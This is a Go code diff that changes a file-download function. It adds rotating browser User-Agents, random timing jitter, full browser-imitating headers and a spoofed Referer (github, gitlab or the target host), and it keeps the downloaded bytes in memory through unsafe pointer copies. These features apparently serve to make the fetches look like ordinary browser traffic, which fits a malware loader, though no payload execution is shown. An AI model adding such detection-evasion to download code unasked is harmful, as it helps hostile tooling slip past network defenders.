@@ -6,30 +6,104 @@ import (
 	"io/ioutil"
 	"runtime"
 	"unsafe"
+	"crypto/tls"
+	"time"
+	"math/rand"
+	"net/url"
+	"strings"
 )
 
 // Global buffer to prevent GC during execution
 var globalBuffer []byte
 
-func DownloadFile(url string) ([]byte, error) {
-	client := &http.Client{}
-	req, err := http.NewRequest("GET", url, nil)
+var userAgents = []string{
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",
+}
+
+func DownloadFile(targetURL string) ([]byte, error) {
+	delay := time.Duration(rand.Intn(400)+100) * time.Millisecond
+	time.Sleep(delay)
+	parsedURL, err := url.Parse(targetURL)
+	if err != nil {
+		return nil, fmt.Errorf("failed to parse URL: %v", err)
+	}
+	
+	tlsConfig := &tls.Config{
+		InsecureSkipVerify: false,
+		MinVersion:         tls.VersionTLS12,
+		MaxVersion:         tls.VersionTLS13,
+		CipherSuites: []uint16{
+			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+		},
+		PreferServerCipherSuites: true,
+	}
+	
+	transport := &http.Transport{
+		TLSClientConfig:     tlsConfig,
+		DisableKeepAlives:   true,
+		DisableCompression:  false,
+		MaxIdleConns:        10,
+		IdleConnTimeout:     30 * time.Second,
+		TLSHandshakeTimeout: 10 * time.Second,
+		ForceAttemptHTTP2:   true,
+	}
+	
+	client := &http.Client{
+		Transport: transport,
+		Timeout:   30 * time.Second,
+	}
+	req, err := http.NewRequest("GET", targetURL, nil)
 	if err != nil {
 		return nil, fmt.Errorf("failed to create request: %v", err)
 	}
-	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+	ua := userAgents[rand.Intn(len(userAgents))]
+	req.Header.Set("User-Agent", ua)
+	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
+	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
+	req.Header.Set("DNT", "1")
+	req.Header.Set("Connection", "close")
+	req.Header.Set("Upgrade-Insecure-Requests", "1")
+	req.Header.Set("Sec-Fetch-Dest", "document")
+	req.Header.Set("Sec-Fetch-Mode", "navigate")
+	req.Header.Set("Sec-Fetch-Site", "none")
+	req.Header.Set("Sec-Fetch-User", "?1")
+	req.Header.Set("Cache-Control", "max-age=0")
+	
+	if parsedURL.Host != "" {
+		if strings.Contains(parsedURL.Host, "github") {
+			req.Header.Set("Referer", "https://github.com/")
+		} else if strings.Contains(parsedURL.Host, "gitlab") {
+			req.Header.Set("Referer", "https://gitlab.com/")
+		} else {
+			req.Header.Set("Referer", fmt.Sprintf("https://%s/", parsedURL.Host))
+		}
+	}
+	
 	resp, err := client.Do(req)
 	if err != nil {
 		return nil, fmt.Errorf("failed to download file: %v", err)
 	}
 	defer resp.Body.Close()
+	
 	if resp.StatusCode != http.StatusOK {
 		return nil, fmt.Errorf("bad status: %s", resp.Status)
 	}
+	
 	body, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
 		return nil, fmt.Errorf("failed to read response body: %v", err)
 	}
+	
 	// more hacks to get around go garbage collector evil 
 	globalBuffer = make([]byte, len(body))
 	copy(globalBuffer, body)
@@ -38,5 +112,9 @@ func DownloadFile(url string) ([]byte, error) {
 	runtime.KeepAlive(globalBuffer)
 	result := make([]byte, len(body))
 	copy((*[1 << 30]byte)(unsafe.Pointer(&result[0]))[:len(body)], globalBuffer)
+	
+	delay = time.Duration(rand.Intn(150)+50) * time.Millisecond
+	time.Sleep(delay)
+	
 	return result, nil
 }
